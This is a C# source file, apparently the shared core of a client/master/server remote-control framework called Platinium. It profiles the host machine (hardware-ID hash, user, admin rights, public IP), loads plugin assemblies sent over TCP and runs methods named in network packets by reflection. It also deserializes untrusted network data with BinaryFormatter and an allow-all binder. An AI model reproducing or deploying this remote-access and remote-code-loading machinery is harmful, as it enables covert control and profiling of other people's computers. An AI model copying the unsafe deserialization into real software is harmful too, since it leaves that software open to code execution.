using Platinium.Shared.Data.Packages;
using Platinium.Shared.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.ComponentModel.Composition;
using System.ComponentModel.Composition.Hosting;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Collections;
using System.Net;
using System.Runtime.Serialization;
using Platinium.Shared.Plugin;
using Platinium.Shared.Data.Structures;
using System.Threading;
using Platinium.Shared.Content;
using System.Reflection;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.DirectoryServices.AccountManagement;
using System.Globalization;
using Platinium.Connection;
using Platinium.Shared.Data.Serialization;
using System.Windows.Forms;
using System.Windows.Threading;
using System.IO.Compression;
using Platinium.Shared.Data.Compression;
using Platinium.Shared.Core;

namespace Platinium
{
    namespace Shared
    {
        namespace Core
        {
            public partial class Converter
            {
                public static Dictionary<string, object> ClassToDictionary(object objectToConvert)
                {
                    return objectToConvert.GetType()
                         .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                         .ToDictionary(prop => prop.Name, prop => prop.GetValue(objectToConvert, null));
                }
                public static List<Dictionary<string, object>> ClassToDictionaryList(List<object> objectListToConvert)
                {
                    List<Dictionary<string, object>> tempList = new List<Dictionary<string, object>>();
                    foreach (object objectToConvert in objectListToConvert)
                    {
                        tempList.Add(objectToConvert.GetType()
                         .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                         .ToDictionary(prop => prop.Name, prop => prop.GetValue(objectToConvert, null)));
                    }
                    return tempList;
                }
            }
            public static class Extensions
            {
                public static string EmptyIfNull(this object value)
                {
                    if (value == null)
                    {
                        return "NULL";
                    }
                    return value.ToString();
                }
            }
            /// <summary>
            /// Generates a 16 byte Unique Identification code of a computer
            /// Example: 4876-8DB5-EE85-69D3-FE52-8CF7-395D-2EA9
            /// </summary>
            public class FingerPrint
            {
                private static string fingerPrint = string.Empty;
                public static string Value()
                {
                    if (string.IsNullOrEmpty(fingerPrint))
                    {
                        fingerPrint = GetHash("CPU >> " + cpuId() + "\nBIOS >> " + biosId() + "\nBASE >> " + baseId() + "\nMAC >> " + macId());
                    }
                    return fingerPrint;
                }
                private static string GetHash(string s)
                {
                    MD5 sec = new MD5CryptoServiceProvider();
                    ASCIIEncoding enc = new ASCIIEncoding();
                    byte[] bt = enc.GetBytes(s);
                    return GetHexString(sec.ComputeHash(bt));
                }
                private static string GetHexString(byte[] bt)
                {
                    string s = string.Empty;
                    for (int i = 0; i < bt.Length; i++)
                    {
                        byte b = bt[i];
                        int n, n1, n2;
                        n = (int)b;
                        n1 = n & 15;
                        n2 = (n >> 4) & 15;
                        if (n2 > 9)
                            s += ((char)(n2 - 10 + (int)'A')).ToString();
                        else
                            s += n2.ToString();
                        if (n1 > 9)
                            s += ((char)(n1 - 10 + (int)'A')).ToString();
                        else
                            s += n1.ToString();
                        if ((i + 1) != bt.Length && (i + 1) % 2 == 0) s += "-";
                    }
                    return s;
                }
                #region Original Device ID Getting Code
                private static string identifier
                (string wmiClass, string wmiProperty, string wmiMustBeTrue)
                {
                    string result = "";
                    ManagementClass mc =
                new ManagementClass(wmiClass);
                    ManagementObjectCollection moc = mc.GetInstances();
                    foreach (ManagementObject mo in moc)
                    {
                        if (mo[wmiMustBeTrue].ToString() == "True")
                        {
                            if (result == "")
                            {
                                try
                                {
                                    result = mo[wmiProperty].ToString();
                                    break;
                                }
                                catch
                                {
                                }
                            }
                        }
                    }
                    return result;
                }
                private static string identifier(string wmiClass, string wmiProperty)
                {
                    string result = "";
                    ManagementClass mc =
                new ManagementClass(wmiClass);
                    ManagementObjectCollection moc = mc.GetInstances();
                    foreach (ManagementObject mo in moc)
                    {
                        //Only get the first one
                        if (result == "")
                        {
                            try
                            {
                                result = mo[wmiProperty].ToString();
                                break;
                            }
                            catch
                            {
                            }
                        }
                    }
                    return result;
                }
                private static string cpuId()
                {
                    string retVal = identifier("Win32_Processor", "UniqueId");
                    if (retVal == "")
                    {
                        retVal = identifier("Win32_Processor", "ProcessorId");
                        if (retVal == "")
                        {
                            retVal = identifier("Win32_Processor", "Name");
                            if (retVal == "")
                            {
                                retVal = identifier("Win32_Processor", "Manufacturer");
                            }
                            retVal += identifier("Win32_Processor", "MaxClockSpeed");
                        }
                    }
                    return retVal;
                }
                private static string biosId()
                {
                    return identifier("Win32_BIOS", "Manufacturer")
                    + identifier("Win32_BIOS", "SMBIOSBIOSVersion")
                    + identifier("Win32_BIOS", "IdentificationCode")
                    + identifier("Win32_BIOS", "SerialNumber")
                    + identifier("Win32_BIOS", "ReleaseDate")
                    + identifier("Win32_BIOS", "Version");
                }
                private static string diskId()
                {
                    return identifier("Win32_DiskDrive", "Model")
                    + identifier("Win32_DiskDrive", "Manufacturer")
                    + identifier("Win32_DiskDrive", "Signature")
                    + identifier("Win32_DiskDrive", "TotalHeads");
                }
                private static string baseId()
                {
                    return identifier("Win32_BaseBoard", "Model")
                    + identifier("Win32_BaseBoard", "Manufacturer")
                    + identifier("Win32_BaseBoard", "Name")
                    + identifier("Win32_BaseBoard", "SerialNumber");
                }
                private static string videoId()
                {
                    return identifier("Win32_VideoController", "DriverVersion")
                    + identifier("Win32_VideoController", "Name");
                }
                private static string macId()
                {
                    return identifier("Win32_NetworkAdapterConfiguration",
                        "MACAddress", "IPEnabled");
                }
                #endregion
            }
            public class CFunctions
            {
                public static bool IsAdministrator()
                {
                    bool ret;
                    try
                    {
                        WindowsIdentity identity = WindowsIdentity.GetCurrent();
                        WindowsPrincipal principal = new WindowsPrincipal(identity);
                        ret = principal.IsInRole(WindowsBuiltInRole.Administrator);
                    }
                    catch (Exception) { ret = false; }
                    return ret;
                }
                public static string GetPublicIP()
                {
                    string ret;
                    WebClient wc = new WebClient();
                    try
                    {
                        ret = wc.DownloadString(@"http://icanhazip.com").Trim();
                    }
                    catch (Exception) { ret = "0.0.0.0"; }
                    return ret;
                }
                public static string GetMacAddress()
                {
                    string ret;
                    try
                    {
                        ret = (from nic in NetworkInterface.GetAllNetworkInterfaces()
                               where nic.OperationalStatus == OperationalStatus.Up
                               select nic.GetPhysicalAddress().ToString()).FirstOrDefault();
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                public static string GetCurrentLoggedUser()
                {
                    string ret;
                    try
                    {
                        ret = WindowsIdentity.GetCurrent().Name;
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                public static string GetComputerName()
                {
                    string ret;
                    try
                    {
                        ret = Dns.GetHostName();
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                public static string GetCurrentCulture()
                {
                    string ret;
                    try
                    {
                        ret = CultureInfo.CurrentCulture.TwoLetterISOLanguageName;
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                public static string GetAppNetVersion()
                {
                    string ret;
                    try
                    {
                        ret = Assembly.GetExecutingAssembly().GetReferencedAssemblies().Where(x => x.Name == "System.Core").First().Version.ToString();
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                public static string GetOSName()
                {
                    string ret;
                    try
                    {
                        ret = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                               select x.GetPropertyValue("Caption")).FirstOrDefault().ToString();
                    }
                    catch (Exception) { ret = "0"; }
                    return ret != null ? ret.ToString() : "Unknown";
                }
            }
            public class Logger
            {
                public string Path { get; set; }
                public Logger()
                {

                }
                public void LogMessageToFile(string message)
                {
                    StreamWriter sw = File.AppendText(Path);
                    try
                    {
                        string logLine = String.Format("[{0:G}]: {1}", DateTime.Now, message);
                        sw.WriteLine(logLine);
                    }
                    catch (Exception) { }
                    finally { sw.Close(); }
                }
            }
            public enum LogLevel
            {
                Networ,
            }
        }
        namespace Content
        {
            public enum PackageType
            {
                Base,
                Data,
                PluginCommand,
                Status,
                NoResponse,
                Response
            }
            [Serializable]
            public class Command
            {
                public string Type { get; set; }
                public string CommandContent { get; set; }
                public Command()
                {

                }
                public Command(string type, string command)
                {
                    Type = type;
                    CommandContent = command;
                }
            }
        }
        namespace Plugin
        {
            /// <summary>
            /// The IPlugin Interface.
            /// </summary>
            public interface IPlugin
            {
                void Action();
                void InstantiateClient();
                void InstantiateMaster();
                IPluginClientController ClientController { get; set; }
                IPluginMasterController MasterController { get; set; }
                UserControlModule PluginInterfaceControl { get; set; }
            }
            public interface IPluginClientController
            {
                Package Action(Package inPackage);
            }
            public interface IPluginMasterController
            {
                Package Action(Package inPackage);
            }
            public class Metadata : Attribute
            {
                public string Name { get; set; }
                public string Version { get; set; }
                public string Description { get; set; }
            }
            public partial class PluginFactory
            {
                public static Package HandlePluginMethods(Package inPackage, BaseInfoType baseInfoType)
                {
                    Package returnPackage = inPackage;
                    string[] commands = inPackage.Command.Split('|');
                    string plugin_name = commands[0];
                    string plugin_command = commands[1];
                    object[] command_parameters = { inPackage };
                    Type type = null;
                    if (baseInfoType == BaseInfoType.Client)
                    {
                        type = DataStructure.PluginDictionary.Where(l => l.Key.Name.Equals(plugin_name)).Select(l => l.Value).FirstOrDefault().ClientController.GetType();
                    }
                    else if (baseInfoType == BaseInfoType.Master)
                    {
                        type = DataStructure.PluginDictionary.Where(l => l.Key.Name.Equals(plugin_name)).Select(l => l.Value).FirstOrDefault().MasterController.GetType();
                    }

                    if (type != null)
                    {
                        MethodInfo methodInfo = type.GetMethod(plugin_command);
                        if (methodInfo != null)
                        {
                            ParameterInfo[] parameters = methodInfo.GetParameters();
                            IPlugin pluginInstance = DataStructure.PluginDictionary.Where(l => l.Key.Name.Equals(plugin_name)).Select(l => l.Value).FirstOrDefault();

                            if (parameters.Length == 0)
                            {
                                if (baseInfoType == BaseInfoType.Client)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.ClientController, null);
                                }
                                else if (baseInfoType == BaseInfoType.Master)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.MasterController, null);
                                }
                            }
                            else
                            {
                                if (baseInfoType == BaseInfoType.Client)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.ClientController, command_parameters.ToArray());
                                }
                                else if (baseInfoType == BaseInfoType.Master)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.MasterController, command_parameters.ToArray());
                                }
                            }
                        }
                    }
                    return returnPackage;
                }
            }
        }
        namespace Data
        {
            namespace Compression
            {
                public class Compressor
                {
                    public static byte[] Compress(byte[] raw)
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            using (GZipStream gzip = new GZipStream(ms, CompressionMode.Compress, true))
                            {
                                gzip.Write(raw, 0, raw.Length);
                            }
                            return ms.ToArray();
                        }
                    }
                    public static byte[] Decompress(byte[] cgzip)
                    {
                        using (GZipStream gzip = new GZipStream(new MemoryStream(cgzip), CompressionMode.Decompress))
                        {
                            const int size = 4096;
                            byte[] buffer = new byte[size];
                            using (MemoryStream ms = new MemoryStream())
                            {
                                int count = 0;
                                do
                                {
                                    count = gzip.Read(buffer, 0, size);
                                    if (count > 0)
                                    {
                                        ms.Write(buffer, 0, count);
                                    }
                                } while (count > 0);
                                return ms.ToArray();
                            }
                        }
                    }
                }
            }
            namespace Network
            {
                public class NetworkManagement
                {
                    public static Package ReadData(TcpClient Socket)
                    {
                        NetworkStream networkStream = Socket.GetStream();
                        List<byte> data = new List<byte>();
                        if (networkStream.CanRead)
                        {
                            byte[] buffer = new byte[1024];
                            int totalBytesRead = 0;
                            do
                            {
                                totalBytesRead = networkStream.Read(buffer, 0, buffer.Length);
                                data.AddRange(buffer);
                            } while (networkStream.DataAvailable);
                        }
                        return (Package)Serializer.Deserialize(Compressor.Decompress(data.ToArray()));
                    }
                    public static Package ReadData(TcpClient Socket, Logger logger)
                    {
                        NetworkStream networkStream = Socket.GetStream();
                        List<byte> data = new List<byte>();
                        if (networkStream.CanRead)
                        {
                            byte[] buffer = new byte[1024];
                            int totalBytesRead = 0;
                            do
                            {
                                totalBytesRead = networkStream.Read(buffer, 0, buffer.Length);
                                data.AddRange(buffer);
                            } while (networkStream.DataAvailable);
                            logger.LogMessageToFile($"Data received. Size {totalBytesRead} bytes.");
                        }
                        return (Package)Serializer.Deserialize(Compressor.Decompress(data.ToArray()));
                    }
                    public static void WriteData(TcpClient Socket, Package Package)
                    {
                        byte[] data = Compressor.Compress(Serializer.Serialize(Package));
                        NetworkStream networkStream = Socket.GetStream();
                        if (networkStream.CanWrite)
                        {
                            networkStream.Write(data, 0, data.Length);
                        }
                    }
                    public static void WriteData(TcpClient Socket, Package Package, Logger logger)
                    {
                        byte[] data = Compressor.Compress(Serializer.Serialize(Package));
                        NetworkStream networkStream = Socket.GetStream();
                        if (networkStream.CanWrite)
                        {
                            networkStream.Write(data, 0, data.Length);
                        }
                        logger.LogMessageToFile($"Data sent. Size {data.Length} bytes.");
                    }
                }
            }
            namespace Packages
            {
                public class PackageFactory
                {
                    public static Package HandleServerPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, inPackage.To, inPackage.From);
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        returnPackage = new Package("LOAD_PLUGINS", DataStructure.AssemblyRaw, PackageType.Data, inPackage.To, inPackage.From);
                                        break;
                                    case "CLIENT_LIST":
                                        returnPackage = new Package("CLIENT_LIST", DataStructure.ClientList, PackageType.Data, inPackage.To, inPackage.From);
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                        }
                        return returnPackage;
                    }
                    public static Package HandleClientPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, inPackage.To, new ClientInfo(BaseInfoType.Server));
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        DataStructure.AssemblyRaw = (List<byte[]>)inPackage.Content;
                                        Console.WriteLine("LOADED ASSEMBLIES");
                                        foreach (var assemblyData in DataStructure.AssemblyRaw)
                                        {
                                            Assembly assembly = Assembly.Load(assemblyData);
                                            DataStructure.LoadedAssemblyList.Add(assembly);
                                        }
                                        Type pluginType = typeof(IPlugin);
                                        ICollection<Type> pluginTypes = new List<Type>();
                                        foreach (Assembly assembly in DataStructure.LoadedAssemblyList)
                                        {
                                            Type[] types = assembly.GetTypes();
                                            foreach (Type type in types)
                                            {
                                                if (!type.IsInterface || !type.IsAbstract)
                                                {
                                                    if ((type.GetInterface(pluginType.FullName) != null) && (!type.IsInterface || !type.IsAbstract))
                                                    {
                                                        pluginTypes.Add(type);
                                                    }
                                                }
                                            }
                                        }
                                        foreach (Type type in pluginTypes)
                                        {
                                            IPlugin plugin = (IPlugin)Activator.CreateInstance(type);
                                            var pluginMetadata = (Metadata[])type.GetCustomAttributes(typeof(Metadata), true);
                                            DataStructure.PluginDictionary.Clear();
                                            DataStructure.PluginDictionary.Add(pluginMetadata[0], plugin);
                                            plugin.InstantiateClient();
                                        }
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = PluginFactory.HandlePluginMethods(inPackage, BaseInfoType.Client);
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                        }
                        return returnPackage;
                    }
                    public static Package HandleMasterPackages(Package inPackage)
                    {
                        Package returnPackage = inPackage;
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command)
                                {
                                    case "LOAD_PLUGINS":
                                        DataStructure.AssemblyRaw = (List<byte[]>)inPackage.Content;
                                        Console.WriteLine("LOADED ASSEMBLIES");
                                        foreach (var assemblyData in DataStructure.AssemblyRaw)
                                        {
                                            Assembly assembly = Assembly.Load(assemblyData);
                                            DataStructure.LoadedAssemblyList.Add(assembly);
                                        }
                                        Type pluginType = typeof(IPlugin);
                                        ICollection<Type> pluginTypes = new List<Type>();
                                        foreach (Assembly assembly in DataStructure.LoadedAssemblyList)
                                        {
                                            Type[] types = assembly.GetTypes();
                                            foreach (Type type in types)
                                            {
                                                if (!type.IsInterface || !type.IsAbstract)
                                                {
                                                    if ((type.GetInterface(pluginType.FullName) != null) && (!type.IsInterface || !type.IsAbstract))
                                                    {
                                                        pluginTypes.Add(type);
                                                    }
                                                }
                                            }
                                        }
                                        foreach (Type type in pluginTypes)
                                        {
                                            IPlugin plugin = (IPlugin)Activator.CreateInstance(type);
                                            var pluginMetadata = (Metadata[])type.GetCustomAttributes(typeof(Metadata), true);
                                            MethodInfo[] methodInfo = type.GetMethods(BindingFlags.Public | BindingFlags.Instance);
                                            DataStructure.PluginDictionary.Clear();
                                            DataStructure.PluginMethodDictionary.Clear();
                                            DataStructure.PluginDictionary.Add(pluginMetadata[0], plugin);
                                            DataStructure.PluginMethodDictionary.Add(pluginMetadata[0], methodInfo);
                                            plugin.InstantiateMaster();
                                        }
                                        break;
                                    case "CLIENT_LIST":
                                        DataStructure.ClientList = (List<ClientInfo>)inPackage.Content;
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = PluginFactory.HandlePluginMethods(inPackage, BaseInfoType.Master);
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                        }
                        return returnPackage;
                    }
                }
                [Serializable]
                public class Package
                {
                    public ClientInfo To { get; private set; }
                    public ClientInfo From { get; private set; }
                    public string Command { get; private set; }
                    public object Content { get; private set; }
                    public PackageType PackageType { get; private set; }
                    public Package(string command, object obj, PackageType packagetype, ClientInfo from, ClientInfo to)
                    {
                        Command = command;
                        To = to;
                        PackageType = packagetype;
                        From = from;
                        Content = obj;
                    }
                    public Package(string command, object obj, PackageType packagetype, ClientInfo from)
                    {
                        Command = command;
                        From = from;
                        Content = obj;
                        PackageType = packagetype;
                    }
                }
            }
            namespace Serialization
            {
                sealed class AllowAllAssemblyVersionsDeserializationBinder : SerializationBinder
                {
                    public override Type BindToType(string assemblyName, string typeName)
                    {
                        Type typeToDeserialize = null;
                        string currentAssembly = Assembly.GetExecutingAssembly().FullName;
                        assemblyName = currentAssembly;
                        typeToDeserialize = Type.GetType(String.Format("{0}, {1}", typeName, assemblyName));
                        return typeToDeserialize;
                    }
                }
                public class Serializer
                {
                    public static byte[] Serialize(object objToSerialize)
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            (bf).Serialize(memoryStream, objToSerialize);
                            return memoryStream.ToArray();
                        }
                    }
                    public static object Deserialize(byte[] data)
                    {
                        using (var memoryStream = new MemoryStream(data))
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            memoryStream.Seek(0, SeekOrigin.Begin);
                            return (bf).Deserialize(memoryStream);
                        }
                    }
                }
            }
            namespace Structures
            {
                [Serializable]
                public static class DataStructure
                {
                    public static List<ClientInfo> MasterList = new List<ClientInfo>();
                    public static List<ClientInfo> ClientList = new List<ClientInfo>();
                    public static Dictionary<Metadata, IPlugin> PluginDictionary = new Dictionary<Metadata, IPlugin>();
                    public static Dictionary<Metadata, MethodInfo[]> PluginMethodDictionary = new Dictionary<Metadata, MethodInfo[]>();
                    public static List<byte[]> AssemblyRaw = new List<byte[]>();
                    public static List<Assembly> LoadedAssemblyList = new List<Assembly>();
                }
            }
        }
        namespace Info
        {
            public enum BaseInfoType
            {
                Client,
                Master,
                Server
            }
            [Serializable]
            public class ClientInfo : IEnumerable<object>
            {
                public string IP { get; set; }
                public string MACAddress { get; set; }
                public string UserName { get; set; }
                public string ComputerName { get; set; }
                public string UID { get; set; }
                public string Language { get; set; }
                public bool IsAdministrator { get; set; }
                public string OSName { get; set; }
                public double AppVersion { get; private set; }
                public string AppNetVersion { get; set; }
                public bool IsConnected { get; set; } = false;

                public BaseInfoType Type { get; set; }
                [NonSerialized]
                private Connector _connector;
                public Connector Connector { get { return _connector; } set { _connector = value; } }
                public ClientInfo()
                {
                    AppVersion = 1.0;
                }
                public ClientInfo(string uid, BaseInfoType type)
                {
                    AppVersion = 1.0;
                    UID = uid;
                    Type = type;
                }
                public ClientInfo(string uid)
                {
                    AppVersion = 1.0;
                    UID = uid;
                    Type = BaseInfoType.Client;
                }
                public ClientInfo(BaseInfoType type)
                {
                    AppVersion = 1.0;
                    Type = type;
                }
                private IEnumerable<object> Info()
                {
                    yield return IP;
                    yield return MACAddress;
                    yield return UserName;
                    yield return ComputerName;
                    yield return OSName;
                    yield return AppVersion;
                    yield return AppNetVersion;
                    yield return IsAdministrator;
                    yield return UID;
                    yield return Language;
                    yield return Type;
                }
                public IEnumerator<object> GetEnumerator()
                {
                    return Info().GetEnumerator();
                }
                IEnumerator IEnumerable.GetEnumerator()
                {
                    return GetEnumerator();
                }
            }
        }
    }
}
